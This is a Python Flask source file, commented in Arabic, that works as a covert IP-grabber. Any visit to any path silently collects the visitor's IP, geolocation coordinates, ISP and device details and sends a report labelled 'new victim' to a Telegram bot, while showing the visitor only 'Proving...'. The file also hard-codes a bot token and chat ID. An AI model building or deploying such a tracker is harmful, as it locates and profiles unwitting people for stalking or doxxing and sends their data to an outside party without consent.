# app.py
from flask import Flask, request
import requests
from datetime import datetime
import os
import re
import socket
import json

app = Flask(__name__)

# ========== الإعدادات ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8634923674:AAFK3q-9prlbYx-jDnyvMrDIAlP8JJuc-8E")
CHAT_ID = os.environ.get("CHAT_ID", "8203901188")
# ===============================

def get_real_ip(request):
    """تجيب الـ IP الحقيقي"""
    cf_ip = request.headers.get('CF-Connecting-IP')
    if cf_ip:
        return cf_ip.split(',')[0].strip()
    
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    
    real_ip = request.headers.get('X-Real-IP')
    if real_ip:
        return real_ip.split(',')[0].strip()
    
    return request.remote_addr

def get_location_info(ip):
    """معلومات الموقع الحقيقية"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query", timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return {
                    "country": data.get('country', 'غير معروف'),
                    "countryCode": data.get('countryCode', 'غير معروف'),
                    "city": data.get('city', 'غير معروف'),
                    "region": data.get('regionName', 'غير معروف'),
                    "postal": data.get('zip', 'غير معروف'),
                    "latitude": data.get('lat', 'غير معروف'),
                    "longitude": data.get('lon', 'غير معروف'),
                    "timezone": data.get('timezone', 'غير معروف'),
                    "isp": data.get('isp', 'غير معروف'),
                    "org": data.get('org', 'غير معروف'),
                    "asn": data.get('as', 'غير معروف'),
                    "mobile": data.get('mobile', False),
                    "proxy": data.get('proxy', False),
                    "hosting": data.get('hosting', False),
                    "query": data.get('query', ip)
                }
    except:
        pass
    
    return {
        "country": "غير معروف",
        "countryCode": "غير معروف",
        "city": "غير معروف",
        "region": "غير معروف",
        "postal": "غير معروف",
        "latitude": "غير معروف",
        "longitude": "غير معروف",
        "timezone": "غير معروف",
        "isp": "غير معروف",
        "org": "غير معروف",
        "asn": "غير معروف",
        "mobile": False,
        "proxy": False,
        "hosting": False,
        "query": ip
    }

def get_device_info(user_agent):
    """معلومات الجهاز"""
    info = {
        "os": "غير معروف",
        "browser": "غير معروف",
        "device": "كمبيوتر",
        "brand": "غير معروف",
        "model": "غير معروف"
    }
    
    ua = user_agent.lower()
    
    # نظام التشغيل
    if "android" in ua:
        info["os"] = "Android"
        info["device"] = "موبايل"
        if "samsung" in ua or "sm-" in ua:
            info["brand"] = "Samsung"
        elif "huawei" in ua:
            info["brand"] = "Huawei"
        elif "xiaomi" in ua or "mi " in ua:
            info["brand"] = "Xiaomi"
        elif "oppo" in ua:
            info["brand"] = "OPPO"
        elif "vivo" in ua:
            info["brand"] = "Vivo"
    elif "iphone" in ua:
        info["os"] = "iOS"
        info["device"] = "iPhone"
        info["brand"] = "Apple"
    elif "ipad" in ua:
        info["os"] = "iPadOS"
        info["device"] = "iPad"
        info["brand"] = "Apple"
    elif "windows" in ua:
        info["os"] = "Windows"
    elif "mac" in ua:
        info["os"] = "macOS"
        info["brand"] = "Apple"
    elif "linux" in ua:
        info["os"] = "Linux"
    
    # المتصفح
    if "chrome" in ua and "edg" not in ua and "opr" not in ua:
        info["browser"] = "Chrome"
    elif "firefox" in ua:
        info["browser"] = "Firefox"
    elif "safari" in ua and "chrome" not in ua:
        info["browser"] = "Safari"
    elif "edg" in ua:
        info["browser"] = "Edge"
    elif "opr" in ua or "opera" in ua:
        info["browser"] = "Opera"
    
    return info

def get_weather_info(lat, lon):
    """جلب معلومات الطقس كاملة"""
    weather_info = {
        "temperature": "غير معروف",
        "condition": "غير معروف",
        "humidity": "غير معروف",
        "wind_speed": "غير معروف",
        "wind_direction": "غير معروف",
        "pressure": "غير معروف",
        "feels_like": "غير معروف",
        "uv_index": "غير معروف",
        "visibility": "غير معروف",
        "cloud_cover": "غير معروف"
    }
    
    if lat == "غير معروف" or lon == "غير معروف":
        return weather_info
    
    try:
        response = requests.get(
            f"https://api.open-meteo.com/v1/forecast?latitude={lat}&longitude={lon}&current_weather=true&hourly=temperature_2m,relativehumidity_2m,pressure_msl,uv_index,visibility,windspeed_10m,winddirection_10m,cloudcover&timezone=auto",
            timeout=5
        )
        
        if response.status_code == 200:
            data = response.json()
            current = data.get('current_weather', {})
            hourly = data.get('hourly', {})
            
            # درجة الحرارة
            weather_info["temperature"] = f"{current.get('temperature', '?')}°C"
            
            # حالة الطقس من الكود
            weather_code = current.get('weathercode', 0)
            weather_codes = {
                0: '☀️ صافي',
                1: '🌤️ غائم جزئياً',
                2: '⛅ غائم',
                3: '☁️ غائم كلياً',
                45: '🌫️ ضباب',
                48: '🌫️ ضباب مع صقيع',
                51: '🌧️ رذاذ خفيف',
                53: '🌧️ رذاذ متوسط',
                55: '🌧️ رذاذ كثيف',
                56: '🌧️ رذاذ متجمد خفيف',
                57: '🌧️ رذاذ متجمد كثيف',
                61: '🌧️ مطر خفيف',
                63: '🌧️ مطر متوسط',
                65: '🌧️ مطر كثيف',
                66: '🌧️ مطر متجمد خفيف',
                67: '🌧️ مطر متجمد كثيف',
                71: '🌨️ ثلج خفيف',
                73: '🌨️ ثلج متوسط',
                75: '🌨️ ثلج كثيف',
                77: '🌨️ حبات ثلج',
                80: '🌧️ زخات مطر خفيفة',
                81: '🌧️ زخات مطر متوسطة',
                82: '🌧️ زخات مطر كثيفة',
                85: '🌨️ زخات ثلج خفيفة',
                86: '🌨️ زخات ثلج كثيفة',
                95: '⛈️ عاصفة رعدية',
                96: '⛈️ عاصفة رعدية مع برد خفيف',
                99: '⛈️ عاصفة رعدية مع برد كثيف'
            }
            weather_info["condition"] = weather_codes.get(weather_code, 'غير معروف')
            
            # الرطوبة
            hourly_data = hourly.get('relativehumidity_2m', [])
            if len(hourly_data) > 0:
                weather_info["humidity"] = f"{hourly_data[0]}%"
            
            # سرعة الرياح
            weather_info["wind_speed"] = f"{current.get('windspeed', '?')} km/h"
            
            # اتجاه الرياح
            wind_dir = current.get('winddirection', 0)
            directions = ['شمال', 'شمال شرق', 'شرق', 'جنوب شرق', 'جنوب', 'جنوب غرب', 'غرب', 'شمال غرب']
            dir_index = int((wind_dir + 22.5) // 45) % 8
            weather_info["wind_direction"] = directions[dir_index]
            
            # الضغط الجوي
            pressure_data = hourly.get('pressure_msl', [])
            if len(pressure_data) > 0:
                weather_info["pressure"] = f"{pressure_data[0]} hPa"
            
            # الإحساس بالحرارة
            temp_data = hourly.get('temperature_2m', [])
            if len(temp_data) > 1:
                weather_info["feels_like"] = f"{temp_data[1]}°C"
            
            # مؤشر الأشعة فوق البنفسجية
            uv_data = hourly.get('uv_index', [])
            if len(uv_data) > 0:
                uv = uv_data[0]
                uv_text = f"{uv}"
                if uv < 3:
                    uv_text += " (منخفض)"
                elif uv < 6:
                    uv_text += " (متوسط)"
                elif uv < 8:
                    uv_text += " (مرتفع)"
                else:
                    uv_text += " (شديد)"
                weather_info["uv_index"] = uv_text
            
            # مدى الرؤية
            visibility_data = hourly.get('visibility', [])
            if len(visibility_data) > 0:
                vis = visibility_data[0] / 1000
                weather_info["visibility"] = f"{vis} كم"
            
            # نسبة الغطاء السحابي
            cloud_data = hourly.get('cloudcover', [])
            if len(cloud_data) > 0:
                weather_info["cloud_cover"] = f"{cloud_data[0]}%"
    
    except Exception as e:
        print(f"خطأ في الطقس: {e}")
    
    return weather_info

def send_telegram(text):
    """إرسال لتليجرام"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(
            url,
            data={
                "chat_id": CHAT_ID,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True
            },
            timeout=8
        )
        if response.status_code == 200:
            print(f"✅ تم الإرسال {datetime.now().strftime('%H:%M:%S')}")
    except Exception as e:
        print(f"❌ خطأ: {e}")

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    # 1. الـ IP
    real_ip = get_real_ip(request)
    
    # 2. معلومات الموقع
    loc = get_location_info(real_ip)
    
    # 3. معلومات الجهاز
    device = get_device_info(request.headers.get('User-Agent', ''))
    
    # 4. معلومات الطقس الكاملة
    weather = get_weather_info(loc['latitude'], loc['longitude'])
    
    # 5. رسالة واحدة فقط (كل المعلومات)
    report = f"""
╔══════════════════════════════╗
║     ضحية جديدة دخلت 🚨       ║
╚══════════════════════════════╝

📍 <b>الموقع:</b>
├─ الأيبي: {real_ip}
├─ الدولة: {loc['country']} ({loc['countryCode']})
├─ المدينة: {loc['city']}
├─ المنطقة: {loc['region']}
├─ الرمز البريدي: {loc['postal']}
├─ خط الطول: {loc['latitude']}
├─ خط العرض: {loc['longitude']}
└─ الخريطة: https://maps.google.com/?q={loc['latitude']},{loc['longitude']}

📡 <b>الشبكة:</b>
├─ المزود: {loc['isp']}
├─ المنظمة: {loc['org']}
├─ ASN: {loc['asn']}
├─ اتصال موبايل: {'✅' if loc.get('mobile') else '❌'}
├─ VPN/Proxy: {'✅' if loc.get('proxy') else '❌'}
└─ استضافة: {'✅' if loc.get('hosting') else '❌'}

📱 <b>الجهاز:</b>
├─ نظام التشغيل: {device['os']}
├─ المتصفح: {device['browser']}
├─ نوع الجهاز: {device['device']}
├─ الماركة: {device['brand']}
└─ الموديل: {device['model']}

🌦️ <b>حالة الطقس كاملة:</b>
├─ درجة الحرارة: {weather['temperature']}
├─ الإحساس: {weather['feels_like']}
├─ الحالة: {weather['condition']}
├─ الرطوبة: {weather['humidity']}
├─ سرعة الرياح: {weather['wind_speed']}
├─ اتجاه الرياح: {weather['wind_direction']}
├─ الضغط الجوي: {weather['pressure']}
├─ مؤشر UV: {weather['uv_index']}
├─ مدى الرؤية: {weather['visibility']}
└─ الغطاء السحابي: {weather['cloud_cover']}

⏱️ <b>معلومات الدخول:</b>
├─ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
├─ المسار: /{path if path else ''}
└─ الرابط الكامل: {request.url}

🔗 <b>روابط التحقق:</b>
├─ WhatIsMyIP: https://whatismyipaddress.com/ip/{real_ip}
├─ AbuseIPDB: https://www.abuseipdb.com/check/{real_ip}
├─ VirusTotal: https://www.virustotal.com/gui/ip-address/{real_ip}
└─ Shodan: https://www.shodan.io/host/{real_ip}

╔══════════════════════════════╗
║       تم سحب جميع المعلومات  ║
╚══════════════════════════════╝
    """
    
    # 6. إرسال
    send_telegram(report)
    
    # 7. الضحية يشوف هذا
    return "Proving..."

@app.route('/stats')
def stats():
    return {
        "status": "online",
        "time": datetime.now().isoformat(),
        "message": "كل المعلومات حقيقية 100%"
    }

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("="*50)
    print("🚀 API شغال على المنفذ", port)
    print("📡 أي شخص يدخل على أي مسار -> يتم سحب معلوماته")
    print("   ✅ الموقع الحقيقي")
    print("   ✅ معلومات الشبكة")
    print("   ✅ معلومات الجهاز")
    print("   ✅ حالة الطقس كاملة")
    print("="*50)
    app.run(host='0.0.0.0', port=port)